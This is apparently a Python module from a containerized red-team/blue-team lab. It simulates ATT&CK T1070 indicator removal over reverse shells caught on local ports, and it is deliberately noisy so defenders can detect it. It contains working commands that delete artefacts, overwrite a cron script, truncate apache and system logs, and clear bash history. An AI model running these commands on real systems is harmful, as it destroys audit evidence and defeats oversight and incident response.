import re
import socket
import time

from chainlog import log

# =============================================================================
# defensive_evasion.py — Messy and Loud Defensive Evasion
# MITRE ATT&CK:
#   T1070     – Indicator Removal (parent technique)
#   T1070.001 – Clear Linux or Mac System Logs  (log truncation attempts)
#   T1070.003 – Clear Command History
#   T1070.004 – File Deletion
# =============================================================================
# The attacker tries to cover their tracks on both apache (root) and john's
# workstation (john.stravidis) but does so noisily and incompletely:
#
#   • /tmp artefacts targeted by rm are already gone (removed by earlier
#     chain steps) — the redundant deletes generate shell-history entries
#     and "cannot remove" errors that the blue team can correlate.
#   • The hijacked cron script (/opt/cleanup.sh) is overwritten with a bare
#     stub instead of being restored — the original content is lost and the
#     stub looks suspicious when diffed against source control.
#   • Apache log truncation succeeds as root but the bind-mounted log
#     directory means Docker's logging driver has already captured the
#     entries; any FIM watcher records the inode mtime change.
#   • john.stravidis attempts to truncate /var/log/auth.log and
#     /var/log/syslog without permission — the "Permission denied" errors
#     are themselves observable events in the shell history.
#   • bash_history is cleared on both hosts, but the clear commands
#     (history -c, HISTFILE truncation) were already executed and visible
#     in the session buffer before the buffer is wiped.
# =============================================================================

# /tmp artefacts the attacker expects to find on apache — most are already
# removed by prior chain steps; redundant rm calls generate visible errors.
_APACHE_TMP_ARTIFACTS = [
    "/tmp/lp.sh",            # LinPEAS script     (removed by post_exploit_recon)
    "/tmp/lp_out.txt",       # LinPEAS output     (removed by post_exploit_recon)
    "/tmp/john_deploy_key",  # staged deploy key  (removed by lateral_movement)
    "/tmp/cs-scan.gnmap",    # nmap scan results  (removed by credential_stuffing)
]

# /tmp artefacts the attacker expects to find on john's workstation.
_WORKSTATION_TMP_ARTIFACTS = [
    "/tmp/db_dump.dump",     # database dump      (removed by exfiltrate_db)
]

CRON_SCRIPT   = "/opt/cleanup.sh"
APACHE_LOGDIR = "/usr/local/apache2/logs"

_sentinel_seq = 0


# ---------------------------------------------------------------------------
# Shell helpers (same sentinel pattern used across all chain modules)
# ---------------------------------------------------------------------------

def _drain(shell):
    prev = shell.gettimeout()
    shell.settimeout(0.1)
    while True:
        try:
            if not shell.recv(4096):
                break
        except socket.timeout:
            break
    shell.settimeout(prev)


def _run_remote(shell, cmd, timeout=10):
    global _sentinel_seq
    _sentinel_seq += 1
    sentinel = f"DE_SENTINEL_{_sentinel_seq:04X}_END"

    _drain(shell)
    shell.sendall(f"{cmd}\n".encode())
    time.sleep(0.4)
    shell.sendall(f"echo {sentinel}\n".encode())

    prev = shell.gettimeout()
    shell.settimeout(2)
    buf = ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            buf += shell.recv(4096).decode(errors="replace")
        except socket.timeout:
            pass
        if sentinel in buf:
            break
    shell.settimeout(prev)

    if sentinel in buf:
        buf = buf[: buf.index(sentinel)]
    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
    return buf.replace("\r", "").strip()


# ---------------------------------------------------------------------------
# Apache cleanup phases (as root)
# ---------------------------------------------------------------------------

def _apache_delete_artifacts(root_shell):
    """Remove /tmp artefacts on apache (T1070.004).

    Most paths were already cleaned by prior steps — the "cannot remove"
    errors that appear in the shell history are the observable noise signal.
    """
    log("[*] Removing /tmp artefacts from apache ...")
    for path in _APACHE_TMP_ARTIFACTS:
        # No -f: missing-file errors are the point — they show up in history.
        out = _run_remote(root_shell, f"rm {path} 2>&1 || true")
        if "No such file" in out or "cannot remove" in out:
            log(f"[-] {path}: already gone — rm error left in history")
        else:
            log(f"[+] {path}: removed")


def _apache_sanitise_cron_script(root_shell):
    """Overwrite the hijacked cron script with a minimal stub (T1070.004).

    The privesc step replaced /opt/cleanup.sh with a reverse-shell payload.
    The attacker now overwrites it with a bare stub rather than restoring the
    original — the stub is shorter, has no author comments, and the mtime
    change is detectable by FIM or a simple diff against source control.
    """
    log(f"[*] Overwriting hijacked cron script {CRON_SCRIPT} with stub ...")
    out = _run_remote(
        root_shell,
        f"echo '#!/bin/bash' > {CRON_SCRIPT} "
        f"&& echo '# maintenance placeholder' >> {CRON_SCRIPT} "
        f"&& echo 'exit 0' >> {CRON_SCRIPT} "
        f"&& echo CRON_OK || echo CRON_FAIL",
    )
    if "CRON_OK" in out:
        log(
            f"[+] {CRON_SCRIPT}: overwritten with stub "
            "(original Vinzenz/John content lost — mtime changed, content mismatch detectable)"
        )
    else:
        log(f"[-] {CRON_SCRIPT}: overwrite failed ({out!r})")


def _apache_truncate_logs(root_shell):
    """Truncate apache *.log files as root (T1070.001).

    Succeeds because the attacker has root, but the log directory is
    bind-mounted so Docker's logging driver has already captured the entries.
    Any FIM watcher records the inode mtime change even on an empty file.
    """
    log(f"[*] Truncating apache logs in {APACHE_LOGDIR} ...")
    listing = _run_remote(
        root_shell,
        f"find {APACHE_LOGDIR} -maxdepth 1 -type f -name '*.log' 2>/dev/null",
    )
    log_files = [l.strip() for l in listing.splitlines() if l.strip()]
    if not log_files:
        log(f"[-] No *.log files found in {APACHE_LOGDIR}")
        return
    for log_file in log_files:
        out = _run_remote(root_shell, f"> {log_file} && echo TRUNC_OK || echo TRUNC_FAIL")
        if "TRUNC_OK" in out:
            log(f"[+] {log_file}: truncated (FIM records mtime change; Docker logs already captured)")
        else:
            log(f"[-] {log_file}: truncation failed ({out!r})")


def _apache_clear_history(root_shell):
    """Clear root's bash history on apache (T1070.003).

    The clear commands themselves appear in the session history buffer before
    HISTFILE is truncated, so they remain visible until the shell exits.
    """
    log("[*] Clearing bash history on apache (root) ...")
    _run_remote(root_shell, "history -c")
    out = _run_remote(
        root_shell,
        "cat /dev/null > ~/.bash_history && echo HIST_OK || echo HIST_FAIL",
    )
    if "HIST_OK" in out:
        log("[+] ~/.bash_history: truncated (clear commands already in session buffer)")
    else:
        log(f"[-] ~/.bash_history: truncation failed ({out!r})")


# ---------------------------------------------------------------------------
# Workstation cleanup phases (as john.stravidis)
# ---------------------------------------------------------------------------

def _workstation_delete_artifacts(john_shell):
    """Remove /tmp artefacts on the workstation (T1070.004).

    db_dump.dump was already removed by exfiltrate_db — the redundant rm
    generates an error visible in the shell history.
    """
    log("[*] Removing /tmp artefacts from workstation ...")
    for path in _WORKSTATION_TMP_ARTIFACTS:
        out = _run_remote(john_shell, f"rm {path} 2>&1 || true")
        if "No such file" in out or "cannot remove" in out:
            log(f"[-] {path}: already gone — rm error left in history")
        else:
            log(f"[+] {path}: removed")


def _workstation_attempt_log_wipe(john_shell):
    """Attempt to truncate system logs as john.stravidis (T1070.001).

    john has no write access to /var/log — the "Permission denied" errors
    are observable events in the shell history and can trigger auditd alerts.
    """
    log("[*] Attempting to truncate system logs (expect permission denied) ...")
    for log_path in ("/var/log/auth.log", "/var/log/syslog"):
        out = _run_remote(john_shell, f"cat /dev/null > {log_path} 2>&1 || true")
        if "Permission denied" in out or "permission denied" in out:
            log(f"[-] {log_path}: permission denied — failed attempt is itself detectable")
        elif out:
            log(f"[?] {log_path}: unexpected output ({out!r})")
        else:
            log(f"[+] {log_path}: truncated (unexpected — john should not have write access)")


def _workstation_clear_history(john_shell):
    """Clear john.stravidis's bash history (T1070.003)."""
    log("[*] Clearing bash history on workstation (john.stravidis) ...")
    _run_remote(john_shell, "history -c")
    out = _run_remote(
        john_shell,
        "cat /dev/null > ~/.bash_history && echo HIST_OK || echo HIST_FAIL",
    )
    if "HIST_OK" in out:
        log("[+] ~/.bash_history: truncated (clear commands already in session buffer)")
    else:
        log(f"[-] ~/.bash_history: truncation failed ({out!r})")


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def run(root_shell, john_shell):
    """
    Attempt messy indicator removal on apache (root) and john's workstation.

    All phases are individually guarded — failures are logged and the next
    phase continues.  The "messy and loud" design is intentional: the cleanup
    attempts themselves produce observable artefacts (shell-history entries,
    permission-denied events, mtime changes) that the blue team can detect.

    MITRE ATT&CK:
        T1070     – Indicator Removal
        T1070.001 – Clear Linux or Mac System Logs
        T1070.003 – Clear Command History
        T1070.004 – File Deletion

    Args:
        root_shell (socket | None): root shell on apache (privesc step).
        john_shell (socket | None): john.stravidis shell on ubuntu_workstation
                                    (lateral_movement step).
    """
    log("\n[*] Starting defensive evasion (messy indicator removal) ...")

    if root_shell is not None:
        log("\n[*] ── Apache (root) ──────────────────────────────────────")
        for phase in (
            _apache_delete_artifacts,
            _apache_sanitise_cron_script,
            _apache_truncate_logs,
            _apache_clear_history,
        ):
            try:
                phase(root_shell)
            except Exception as exc:
                log(f"[!] {phase.__name__} failed: {exc}")
    else:
        log("[-] root_shell not available — skipping apache cleanup")

    if john_shell is not None:
        log("\n[*] ── Workstation (john.stravidis) ──────────────────────")
        for phase in (
            _workstation_delete_artifacts,
            _workstation_attempt_log_wipe,
            _workstation_clear_history,
        ):
            try:
                phase(john_shell)
            except Exception as exc:
                log(f"[!] {phase.__name__} failed: {exc}")
    else:
        log("[-] john_shell not available — skipping workstation cleanup")

    log("\n[*] Defensive evasion complete — tracks incompletely covered")


# ---------------------------------------------------------------------------
# Standalone test mode
# Usage: docker compose exec kali python3 /Attack-chain/defensive_evasion.py
# Pre-conditions:
#   root shell listening on kali port 5555  (apache → kali)
#   john shell listening on kali port 6666  (workstation → kali)
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    import sys

    PORT_ROOT = 5555
    PORT_JOHN = 6666

    log(f"[*] Test mode — waiting for root shell on :{PORT_ROOT} and john shell on :{PORT_JOHN}")

    def _accept(port):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        try:
            conn, addr = srv.accept()
            log(f"[+] Shell received from {addr[0]} on port {port}")
            return conn
        finally:
            srv.close()

    root_shell = _accept(PORT_ROOT)
    john_shell = _accept(PORT_JOHN)

    run(root_shell, john_shell)
    sys.exit(0)
